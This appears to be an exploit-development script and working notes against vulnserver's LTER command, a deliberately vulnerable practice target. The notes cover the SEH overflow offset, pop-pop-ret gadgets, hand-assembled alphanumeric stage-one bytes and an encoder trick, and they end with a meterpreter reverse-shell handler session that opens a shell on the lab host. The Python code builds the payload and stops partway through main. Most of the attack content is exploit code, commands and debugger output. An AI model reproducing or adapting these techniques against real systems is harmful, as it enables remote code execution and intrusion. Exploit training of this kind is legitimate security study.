#!/usr/bin/env python3
import os, sys, re, socket, binascii, time
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'


NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]       ; exploitable
GDOG [gdog_value]       ; not_exploitable
KSTET [kstet_value]     ; exploitable
GTER [gter_value]       ; exploitable
HTER [hter_value]       ; exploitable
LTER [lter_value]       ; exploitable
KSTAN [lstan_value]     ; not_exploitable
EXIT

With LTER, a heap overflow is possible, but it doesn't look like anything can be done with it.

    oflow_sz = 0x1100
    opcode = "LTER "
    slack = "\x41" * (oflow_sz - sum(iter([len(x) for x in [

    ]])))

    buf = f"{opcode}{slack}"

0:003> g
HEAP[vulnserver.exe]: ZwAllocateVirtualMemory failed c0000018 for heap 00BD0000 (base 00BD6000, size 20000)
(155c.1ea0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00bf630f ebx=00004073 ecx=00bd6000 edx=00bd5f70 esi=00bd0000 edi=00bd0000
eip=7784f23d esp=00e1f738 ebp=00e1f77c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
ntdll!RtlpDeCommitFreeBlock+0x11b:
7784f23d 803803          cmp     byte ptr [eax],3           ds:002b:00bf630f=??


So the default path that is taken, at least initially, seems to be a series of tests against characters in the buffer.  After getting to the end of a four block chain of basic blocks, a single byte is moved to a dest buffer, and a counter is incremented which is used as an index to both buffers.  Both buffers are on the heap.  Comparisons in several of the blocks are looking for a zero, then an alternate branch is taken.  I have not explored the alternate paths yet.  But the overflow of the heap occurs with a buffer of 0x1100 bytes.  I noticed the destination buffer has values directly following its allocation:

0:003> dc edx+0x1000
00715f70  22d7aa59 00007302 007100c0 00712458  Y..".s....q.X$q

These are also heap locations in 0x8 and 0xc.  Not sure what 0x0 is.  

There's this basic block as the first one aftet the initial basic block that does the _malloc and the _memset 0 for 0x1000 bytes.  In this block, the jump is taken because there is no null byte anywhere in the buffer, and the first byte of the buffer is "L" from the string "LTER".

.text:0040233D
.text:0040233D loc_40233D:             ; This function tests a byte from the buf, loop-back tests the next one.  Compared for 0 in order to not take the jump
.text:0040233D mov     edx, [ebp+var_20] ; 0x0
.text:00402340 mov     eax, [ebp+buf]  ; 00713b60
.text:00402343 add     eax, edx
.text:00402345 movzx   eax, byte ptr [eax]
.text:00402348 test    al, al
.text:0040234A jnz     short loc_4022FB

This block tests the byte whether it's signed or not.  
    .text:004022FB
    .text:004022FB loc_4022FB:
    .text:004022FB mov     edx, [ebp+var_20]
    .text:004022FE mov     eax, [ebp+buf]
    .text:00402301 add     eax, edx
    .text:00402303 movzx   eax, byte ptr [eax]
    .text:00402306 test    al, al
    .text:00402308 jns     short loc_402324 ;
    .text:00402308                         ; 0x0

    if not, the jump is taken to this one:
        .text:00402324
        .text:00402324 loc_402324:             ;
        .text:00402324 mov     edx, [ebp+var_20] ; 0x0
        .text:00402327 mov     eax, [ebp+var_60] ; 0x0 (empty buf?)
        .text:0040232A add     edx, eax        ; 0x0, 00714f70
        .text:0040232C mov     ecx, [ebp+var_20] ; 0x0
        .text:0040232F mov     eax, [ebp+buf]  ; 00713b60
        .text:00402332 add     eax, ecx        ; 00713b60, 0x0
        .text:00402334 movzx   eax, byte ptr [eax]
        .text:00402337 mov     [edx], al       ; Single byte from buf gets moved to dest buf
    
    If it is signed, the jump is not taken, and execution moves to this one:
        .text:0040230A mov     edx, [ebp+var_20] 
        .text:0040230D mov     eax, [ebp+var_60]
        .text:00402310 add     eax, edx
        .text:00402312 mov     ecx, [ebp+var_20]
        .text:00402315 mov     edx, [ebp+buf]
        .text:00402318 add     edx, ecx
        .text:0040231A movzx   edx, byte ptr [edx]
        .text:0040231D sub     edx, 7Fh
        .text:00402320 mov     [eax], dl
        .text:00402322 jmp     short loc_402339 ;
        .text:00402322                         ; var_20 gets +1

        basically, the following instruction cuts 0x7f off the top of it if it's signed.  This effectively keeps the values in an unsigned range:
        .text:0040231D sub     edx, 7Fh

Both of the preceding paths lead to this block, which increments a counter and loops back to the first basic block at 0040233D
.text:00402339
.text:00402339 loc_402339:             ;
.text:00402339 add     [ebp+var_20], 1 ; var_20 gets +1

Notably, a crash can be invoked with a buffer of size 0x1020 in order to overwrite the adjacent 0x10 bytes that follow the dest buf on the heap:
0:003> g
(2390.1df8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00716f78 ecx=00100000 edx=00007eff esi=00756770 edi=00710000
eip=77867f60 esp=010af78c ebp=010af92c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
ntdll!RtlpAllocateHeap+0xf00:
77867f60 324602          xor     al,byte ptr [esi+2]        ds:002b:00756772=??


But nothing useful.

If we take the alternate branch after the comparison for byte in buffer being 0x0 (that initial block after the _malloc and _memset 0 0x1000), we end up at the following block:
.text:0040234C mov     [ebp+var_20], 5
.text:00402353 jmp     short loc_402375

5 is moved into var_20.

The next basic block has two paths, one goes off to send a response and eventually close the socket. 

.text:00402375 loc_402375:
.text:00402375 cmp     [ebp+var_20], 0FFFh
.text:0040237C jle     short loc_402355

 It looks unreachable right now because the test checks that var_20 is less than 0xfff, which it always will be because the previous basic block hardcodes var_20 to 5.  There is a loop that comes back to this basic block, but more on that later.  Instead, it appears we'll go to the next basic blcok:

.text:00402355
.text:00402355 loc_402355:             ;
.text:00402355 mov     edx, [ebp+var_20] ; 5
.text:00402358 mov     eax, [ebp+var_60] ; 00bd4f70 "LTER "
.text:0040235B add     eax, edx
.text:0040235D movzx   eax, byte ptr [eax]
.text:00402360 cmp     al, 2Eh ; '.'
.text:00402362 jnz     short loc_402371

var_60 is a pointer to the dest buf, written before encountering a 0x0.  At this point, the buffer sent was ("LTER \x00" + "\x41" * 0x1000)[:1000] or so, so the dest buf only contains "LTER ".  but this basic block is checking for a period ".".  if the byte is a period, we go off to the following basic block:
    .text:00402364 mov     eax, [ebp+var_60]
    .text:00402367 mov     [esp], eax      ; Source
    .text:0040236A call    _Function3                   <------- 
    .text:0040236F jmp     short loc_40237E

    It's a call to _Function3.

If the character isn't a period, we go to this basic block:
    .text:00402371
    .text:00402371 loc_402371:
    .text:00402371 add     [ebp+var_20], 1

    This basic block increments var_20.  The basic block loops back to the cmp [ebp+var_20], 0xfff.

And so it becomes clear.  A dest buffer gets written (and anything above 0x7f gets sub'd 0x7f) so long as no null byte is encountered.  Once it is, we take an alternate path and test for a period character in order to go off to )Function3, while looping and incrementing a counter that can't exceed 0xfff else execution moves out of the loop and sends a message, closes the socket, and returns out of the opcode handler.

In order to exploit the situation, our overflow string must meet the following requirements:
1. Start with "LTER "
2. End with "\x00" (dest buf written until \x00)
3. To read _Function3, the overflow string must encounter'.' by within 0xfff bytes counted into destbuf
3. Not contain "." or "\x00" between start and end (badchars = "\x00\x2e")
4. not contain bytes above 0x7f.  (probably use encoder x86/alpha_mixed)

We've seen _Function3 before.
.text:0040191E ; int __cdecl Function3(char *Source)
.text:0040191E public _Function3
.text:0040191E _Function3 proc near
.text:0040191E
.text:0040191E Destination= byte ptr -7D8h
.text:0040191E Source= dword ptr  8
.text:0040191E
.text:0040191E ; __unwind {
.text:0040191E push    ebp
.text:0040191F mov     ebp, esp
.text:00401921 sub     esp, 7E8h                <-----
.text:00401927 mov     eax, [ebp+Source]
.text:0040192A mov     [esp+4], eax    ; Source
.text:0040192E lea     eax, [ebp+Destination]
.text:00401934 mov     [esp], eax      ; Destination
.text:00401937 call    _strcpy
.text:00401937 call stack gets overwritten:
.text:00401937 0:001>
.text:00401937  # ChildEBP RetAddr
.text:00401937  WARNING:  Stack unwind information not available.  Follwoing frames may be wrong.
.text:00401937  00 00a1fa00 41414141       vulnserver+0x193c
.text:00401937  01 00a1fa04 41414141       0x41414141
.text:00401937  02 00a1fa08 41414141       0x41414141
.text:00401937  03 00a1fa0c 41414141       0x41414141
.text:0040193C nop
.text:0040193D leave
.text:0040193E retn

Overflow because only 0x7E8 bytes is reserved on the stack for the _strcpy, but the buffer is 0x1000 or 0xfff.  The behavior of _strcpy is that it writes a null-terminated string, so it doesn't take a size input like _strncpy.  The call stack gets overwritten.  The return from _Function3 causes a crash.

Let's verify we can crash given these constraints.

    oflow_sz = 0x0fff
    opcode = "LTER "
    ender = "\x2e\x00" # '.\x00'
    slack = "\x41" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        ender
    ]])))
    buf = f"{opcode}{slack}{ender}"

We do in fact invoke a crash in SEH:
0:003> g
(ff8.ac4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7efefefe ebx=0000010c ecx=00b85d4c edx=41414141 esi=00401960 edi=00f90000
eip=76b86819 esp=00f8f210 ebp=00f8fa00 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
msvcrt!strcat+0x89:
76b86819 8917            mov     dword ptr [edi],edx  ds:002b:00f90000=????????
0:003> !exchain
00f8ffcc: 41414141
Invalid exception stack at 41414141

This is good... we've found the crash, we also found the dimensions of the crash.  Let's find SEH offset.

We'll limit the pattern string to the same length constraint as the slack1 region, and send the pattern string instead of the slack string:

    oflow_sz = 0x0fff
    opcode = "LTER "
    ender = "\x2e\x00" # '.\x00'
    slack = "\x41" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        ender
    ]])))
    pattern = sys.argv[2][:(oflow_sz - sum(iter([len(x) for x in [
        opcode,
        ender
    ]])))]
    buf = f"{opcode}{pattern}{ender}"

With the following crash string:
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./lter.py 192.168.56.100:9999 $(msf-pattern_create -l 0xfff -s 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)

SEH crash:
0:001> !exchain
00a9ffcc: 4d69304c
Invalid exception stack at 69304b69

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0xfff -s 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ -q 4d69304c
[*] Exact match at offset 3491

0:001> ? 0xfff
Evaluate expression: 4095 = 00000fff

We need a pop pop ret for SEH.
rp++-ng -f essfunc.dll --va 0x62500000 -b "\x00\x2e" -iusr8 --regex ": pop ... ; pop ... ; ret" 
0x625012f4: pop eax ; pop eax ; ret ; 
0x62501342: pop eax ; pop edx ; ret ; 
0x6250130e: pop ebp ; pop ebp ; ret ; 
0x62501301: pop ebx ; pop ebx ; ret ; 
0x6250160d: pop ebx ; pop esi ; ret ; 
0x62501335: pop ecx ; pop eax ; ret ; 
0x62501353: pop ecx ; pop ecx ; ret ;   <-------
0x62501328: pop ecx ; pop edx ; ret ; 
0x62501883: pop edi ; pop ebp ; ret ; 
0x6250127a: pop esi ; pop ebp ; ret ; 
0x62501a34: pop esi ; pop edi ; ret ; 


    oflow_sz = 0x0fff
    SEH_offset = 3491
    opcode = "LTER "
    ender = "\x2e\x00" # '.\x00'
    slack1 = "\x41" * SEH_offset
    SEH =  packlatin("<L", 0x62501353) # 0x62501353: pop ecx ; pop ecx ; ret ;
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        slack1,
        SEH,
        ender
    ]])))
    buf = f"{opcode}{slack1}{SEH}{slack2}{ender}"

    sock = sender(ip, port,buf)
    sock.recv(1024)  ## clear the airwaves
    sock.close()  

After refactoring for SEH, and after resending, then executing the pop pop ret:
EIP:
00eeffcc 41              inc     ecx
00eeffcd 41              inc     ecx
00eeffce 41              inc     ecx
00eeffcf 41              inc     ecx
00eeffd0 53              push    ebx
00eeffd1 135062          adc     edx,dword ptr [eax+62h]
00eeffd4 42              inc     edx
00eeffd5 42              inc     edx
00eeffd6 42              inc     edx

The problem is that a short jmp has \xeb in it, so that opcode won't work because max \x7f limitation.  We'll need to execute instructions through to past SEH pointer on the stack before we can get anywhere useful.

We can get away with the inc ecx and inc edx instructions, and even the push ebx.  But the adc will be a problem, because regs:
0:003> 
eax=00000000 ebx=00000000 ecx=00eeed60 edx=77968b20 esi=00000000 edi=00000000
eip=00eeffcc esp=00eeec6c ebp=00eeec80 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00eeffcc 41              inc     ecx

0:003> t
(bc0.1174): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00eeed64 edx=77968b20 esi=00000000 edi=00000000
eip=00eeffd1 esp=00eeec68 ebp=00eeec80 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
00eeffd1 135062          adc     edx,dword ptr [eax+62h] ds:002b:00000062=????????

HOWEVER,
0x625012f4: pop eax ; pop eax ; ret ; 
0x62501342: pop eax ; pop edx ; ret ; 
0x6250130e: pop ebp ; pop ebp ; ret ; 
0x62501301: pop ebx ; pop ebx ; ret ; 
0x6250160d: pop ebx ; pop esi ; ret ; 
0x62501335: pop ecx ; pop eax ; ret ;   <------
0x62501353: pop ecx ; pop ecx ; ret ;   
0x62501328: pop ecx ; pop edx ; ret ; 
0x62501883: pop edi ; pop ebp ; ret ; 
0x6250127a: pop esi ; pop ebp ; ret ; 
0x62501a34: pop esi ; pop edi ; ret ; 

A pop ecx, pop eax, ret gives the following at EIP after pop pop ret:
010fffcc 41              inc     ecx
010fffcd 41              inc     ecx
010fffce 41              inc     ecx
010fffcf 41              inc     ecx
010fffd0 3513506242      xor     eax,42625013h
010fffd5 42              inc     edx
010fffd6 42              inc     edx
010fffd7 42              inc     edx
010fffd8 42              inc     edx

That's relatively harmless at this point, So we'll use that.  

With that figured out, it's time to generate some shellcode, and place that a reasonable distance away from SEH, using the inc edx instruction as a substitue for a nop (should work).

So this is a tough one, because there are only 0x30 bytes to work with.
0:003> dd eip
00e1ffcc  41414141 62501335 42424242 42424242
00e1ffdc  42424242 42424242 42424242 42424242
00e1ffec  42424242 42424242 42424242 42424242
00e1fffc  42424242 ???????? ???????? ????????

Further, we can't use any bytes above 0x7f.  That takes a lot of instructions off the table.

For nSEH, we can't really do much with these first four bytes, because of the xor.  We'll continue letting them be inc ecx.

The pop pop ret instruction translates to xor eax,42625013.  We pretty much have to accept that.  

We'll then do a push esp, pop eax to get esp into eax.  That's two bytes.

We should realign eax to the end of the stack, push eax, pop esp.

0:002> ? 00c50000 - eax
Evaluate expression: 5012 = 00001394

0:002> ? 0x94 - 0x7f
Evaluate expression: 21 = 00000015

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "push esp; pop eax; add ax, 0x137f; add al, 0x15; push eax; pop esp;"

    #[.]  push esp\n pop eax\n add ax, 0x137f\n add al, 0x15\n push eax\n pop esp\n
    # 00000000  54                push esp
    # 00000001  58                pop eax
    # 00000002  66057F13          add ax,0x137f
    # 00000006  0415              add al,0x15
    # 00000008  50                push eax
    # 00000009  5C                pop esp
    # 10 bytes

    "\x54\x58\x66\x05\x7f\x13\x04\x15\x50\x5c"      # 54 push esp; 58 pop eax; 66057F13 add ax,0x137f; 0415 add al,0x15; 50 push eax; 5C pop esp # 10 byte

At the end of this region, we need to build out a jmp to somewhere at the beginning of the buffer.

We're looking for somewhere in this ballpark:
0:002> db 00c50000 - 0x1000 + 0x220
00c4f220  00 00 00 00 00 00 00 00-4c 54 45 52 20 41 41 41  ........LTER AAA
00c4f230  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

Somethign 4-byte aligned and at the beginning of the programmable region of the string.
It looks like the best bet would be 00c4f230  .  SO:

0:002> ? 00c50000 - 00c4f230  
Evaluate expression: 3536 = 00000dd0

FOr that, we can use a sub ax,0xd7f.  

0:002> ? 00000dd0 - 0xd7f
Evaluate expression: 81 = 00000051

And a sub al, 0x51.

Then we'll go ahead and push it.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "sub ax, 0x0d7f; sub al, 0x51; push eax"

    #[.]  sub ax, 0x0d7f\n sub al, 0x51\n push eax
    # 00000000  662D7F0D          sub ax,0xd7f
    # 00000004  2C51              sub al,0x51
    # 00000006  50                push eax
    # 7 bytes

    "\x66\x2d\x7f\x0d\x2c\x51\x50"  # 662D7F0D sub ax,0xd7f; 2C51 sub al,0x51; 50 push eax # 7 bytes

Unfortunately, the next step is going to be a little costly.  We need to modify the second to last dword at the end of the stack/region.  But ESP just pushed the last dword.  So we'll need to push another dword, pop it into eax, modify it a bit, then push it back.  We need a jmp instruction that will take us to the begining of the buffer.

That means a jmp, call, or ret.  The address where we need to go is already on the stack, and jmp/call hit different than what is already on the stack:

#[.]  jmp 0x00c4f230
# 00000000  E92BF2C400        jmp 0xc4f230
# 5 bytes

#[.]  call 0x00c4f230
# 00000000  E82BF2C400        call 0xc4f230
# 5 bytes

However, a ret instruction would take us there.

#[.]  ret
# 00000000  C3                ret
# 1 bytes

On the stack, it would need to look like:
0xc3424242

So let's push a starting val, pop it into eax, do some math on it, and push it to the stack.

0:002> ? 0xc3 - 0x42
Evaluate expression: 129 = 00000081
0:002> ? 0xc3 - 0x44
Evaluate expression: 127 = 0000007f
0:002> ? 0x44404040 + 0x7f020202
Evaluate expression: -1019067838 = c3424242


    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "push 0x7f020202; pop eax; add eax, 0x44404040; push eax"

    #[.]  push 0x7f020202\n pop eax\n add eax, 0x44404040\n push eax
    # 00000000  680202027F        push dword 0x7f020202
    # 00000005  58                pop eax
    # 00000006  0540404044        add eax,0x44404040
    # 0000000B  50                push eax
    # 12 bytes

    "\x68\x02\x02\x02\x7f\x58\x05\x40\x40\x40\x44\x50"      # 680202027F push dword 0x7f020202; 58 pop eax; 0540404044 add eax,0x44404040; 50 push eax # 12 bytes

This should be good enough to get us back to the beginning of the buffer.  Let's verify that before continuing.

Upon send of the overflow, things are a little off...

0107ffd0 3513506254      xor     eax,54625013h
0107ffd5 58              pop     eax
0107ffd6 66057f13        add     ax,137Fh

It was supposed to be a push esp; pop eax.  I'll add inc edx (nop-equiv) to even it out.  Really it doesn't matter what is added for this instruction, so long asa it's one byte.  It's going to get added to the xor instruction anyways, so we just need to fill that gap.
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "inc edx; push esp; pop eax; add ax, 0x137f; add al, 0x15; push eax; pop esp;"

    #[.]  inc edx\n push esp\n pop eax\n add ax, 0x137f\n add al, 0x15\n push eax\n pop esp\n
    # 00000000  42                inc edx
    # 00000001  54                push esp
    # 00000002  58                pop eax
    # 00000003  66057F13          add ax,0x137f
    # 00000007  0415              add al,0x15
    # 00000009  50                push eax
    # 0000000A  5C                pop esp
    # 11 bytes

    "\x42\x54\x58\x66\x05\x7f\x13\x04\x15\x50\x5c"  # 42 inc edx; 54 push esp; 58 pop eax; 66057F13 add ax,0x137f; 0415 add al,0x15; 50 push eax; 5C pop esp # 11 bytes

The next problem is that the add al, 0x15 did not add+carry into ah. So eax will have to be manually increased, and it should ahve been add al,0x14 in that case.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "inc edx; push esp; pop eax; add ax, 0x137f; add al, 0x14; inc eax; push eax; pop esp;"

    #[.]  inc edx\n push esp\n pop eax\n add ax, 0x137f\n add al, 0x14\n inc eax\n push eax\n pop esp\n
    # 00000000  42                inc edx
    # 00000001  54                push esp
    # 00000002  58                pop eax
    # 00000003  66057F13          add ax,0x137f
    # 00000007  0414              add al,0x14
    # 00000009  40                inc eax
    # 0000000A  50                push eax
    # 0000000B  5C                pop esp
    # 12 bytes

    "\x42\x54\x58\x66\x05\x7f\x13\x04\x14\x40\x50\x5c"      # 42 inc edx; 54 push esp; 58 pop eax; 66057F13 add ax,0x137f; 0414 add al,0x14; 40 inc eax; 50 push eax; 5C pop esp # 12 bytes

Everything works good now, except esp needs to be incremented four bytes so the ret instruction returns to the curated pointer to beginning of buffer
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "inc esp; inc esp; inc esp; inc esp"

    #[.]  inc esp\n inc esp\n inc esp\n inc esp
    # 00000000  44                inc esp
    # 00000001  44                inc esp
    # 00000002  44                inc esp
    # 00000003  44                inc esp
    # 4 bytes

    "\x44\x44\x44\x44"      # 44 inc esp; 44 inc esp; 44 inc esp; 44 inc esp # 4 bytes

By the end of the stage1, with only the four inc esp instructions left save for the ret, we notice we had four bytes left... luckily we made it 
0:003> db eip
0104fff3  44 44 44 44 42 42 42 42-c3 30 f2 05 01 ?? ?? ??  DDDDBBBB.0...???

0:003> u eip L0xb
0104fff3 44              inc     esp
0104fff4 44              inc     esp
0104fff5 44              inc     esp
0104fff6 44              inc     esp
0104fff7 42              inc     edx
0104fff8 42              inc     edx
0104fff9 42              inc     edx
0104fffa 42              inc     edx
0104fffb c3              ret
0104fffc 30f2            xor     dl,dh
0104fffe 0501            ???

There's a new problem.  The return address is off by 0x10000.  This will need to be adjusted.

Here is the current solution:
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "sub ax, 0x0d7f; sub al, 0x51; push eax"

    #[.]  sub ax, 0x0d7f\n sub al, 0x51\n push eax
    # 00000000  662D7F0D          sub ax,0xd7f
    # 00000004  2C51              sub al,0x51
    # 00000006  50                push eax
    # 7 bytes

    "\x66\x2d\x7f\x0d\x2c\x51\x50"  # 662D7F0D sub ax,0xd7f; 2C51 sub al,0x51; 50 push eax # 7 bytes

The problem is at the time of the frist sub, eax has:
eax=00ec0000 ebx=00000000 ecx=77968b06 edx=77968b20 esi=00000000 edi=00000000

The math works out right:
0:003> ? 00ec0000 - 0xd7f
Evaluate expression: 15463041 = 00ebf281
0:003> ? 00ebf281 - 0x51
Evaluate expression: 15462960 = 00ebf230
0:003> dd 00ebf230
00ebf230  41414141 41414141 41414141 41414141
00ebf240  41414141 41414141 41414141 41414141

However, sub ax doesn't roll 0x00ec down to 0xooeb.  So we'll dec eax, then do the sub, and only for 0x50 for the second one.  The dec eax will roll the high bytes.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "dec eax; sub ax, 0x0d7f; sub al, 0x50; push eax"

    #[.]  dec eax\n sub ax, 0x0d7f\n sub al, 0x50\n push eax
    # 00000000  48                dec eax
    # 00000001  662D7F0D          sub ax,0xd7f
    # 00000005  2C50              sub al,0x50
    # 00000007  50                push eax
    # 8 bytes

    "\x48\x66\x2d\x7f\x0d\x2c\x50\x50"      # 48 dec eax; 662D7F0D sub ax,0xd7f; 2C50 sub al,0x50; 50 push eax # 8 bytes

0:003> ? 00ec0000 -1 -0xd7f - 0x50
Evaluate expression: 15462960 = 00ebf230

After adjusting, and executing the ret, we're right where we want to be:
eax=c3424242 ebx=00000000 ecx=77968b06 edx=77968b23 esi=00000000 edi=00000000
eip=00f3f230 esp=00f40000 ebp=00f3ec80 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
00f3f230 41              inc     ecx

0:003> u eip-0x8
00eef228 4c              dec     esp
00eef229 54              push    esp
00eef22a 45              inc     ebp
00eef22b 52              push    edx
00eef22c 204141          and     byte ptr [ecx+41h],al
00eef22f 41              inc     ecx
00eef230 41              inc     ecx
00eef231 41              inc     ecx

0:003> dc eip-0x8
00eef228  5245544c 41414120 41414141 41414141  LTER AAAAAAAAAAA
00eef238  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA

Excellent.  

So we can start off the beginning of the buffer with looks like, three \x41s, followed by 0x20 \x41s (for nop-equiv), followed by shellcode.

The only thing left to do now is to add the nopsled and shellcode, and profit.

There is one final problem that needs to be overcome.  The alpha_mixed encoder has a preamble in the decoder stub that includes characters in the +0x7f range.  
unsigned char buf[] = 
"\x89\xe3\xda\xd6\xd9\x73\xf4

To overcome this, the BufferRegister option for the payload has an interesting behavior:
BufferRegister=[reg] with alpha_mixed fixes the first several byte preamble that's in the non-ascii range, and tells the shellcode what register holds the address of the shellcode's absolute position.

So we'll need to set up a register for that.  At the ret instruction, esp already holds a pointer to the shellcode, or, the nopsled anyways.  We can try to pop ecx; push ecx earlier around when the *shellcode is first pushed onto the stack.  That will leave us with exactly one unused byte of free space all said and done.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "dec eax; sub ax, 0x0d7f; sub al, 0x50; push eax; pop ecx; push ecx"
    #[.]  dec eax\n sub ax, 0x0d7f\n sub al, 0x50\n push eax\n pop ecx\n push ecx
    # 00000000  48                dec eax
    # 00000001  662D7F0D          sub ax,0xd7f
    # 00000005  2C50              sub al,0x50
    # 00000007  50                push eax
    # 00000008  59                pop ecx
    # 00000009  51                push ecx
    # 10 bytes

    "\x48\x66\x2d\x7f\x0d\x2c\x50\x50\x59\x51"      # 48 dec eax; 662D7F0D sub ax,0xd7f; 2C50 sub al,0x50; 50 push eax; 59 pop ecx; 51 push ecx # 10 bytes

There is yet another problem.  When the dword containing the ret instruction gets pushed, it's pusing 0xc3424242
0:003> u eip-0x5
00ecfff6 44              inc     esp
00ecfff7 44              inc     esp
00ecfff8 42              inc     edx
00ecfff9 42              inc     edx
00ecfffa 42              inc     edx
00ecfffb c3              ret
00ecfffc 30f2            xor     dl,dh
00ecfffe ec              in      al,dx

This overwrites two of the inc esp's.  So we'll need to fix for that so those bytes are 
0xc3424444

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "push 0x7f020202; pop eax; add eax, 0x44404242; push eax"

    #[.]  push 0x7f020202\n pop eax\n add eax, 0x44404242\n push eax
    # 00000000  680202027F        push dword 0x7f020202
    # 00000005  58                pop eax
    # 00000006  0542424044        add eax,0x44404242
    # 0000000B  50                push eax
    # 12 bytes

    "\x68\x02\x02\x02\x7f\x58\x05\x42\x42\x40\x44\x50"      # 680202027F push dword 0x7f020202; 58 pop eax; 0542424044 add eax,0x44404242; 50 push eax # 12 bytes

After fixing, it shells:
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; run"
[sudo] password for notroot: 
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:49762) at 2023-05-27 03:47:50 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 

"""


def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

badchars = "\x00\x2e"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def sender_sockreuse(sock,buf):
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)



    oflow_sz = 0x0fff
    SEH_offset = 3491
    opcode = "LTER "
    ender = "\x2e\x00" # '.\x00'
    nopsled = "\x41" * 0x23
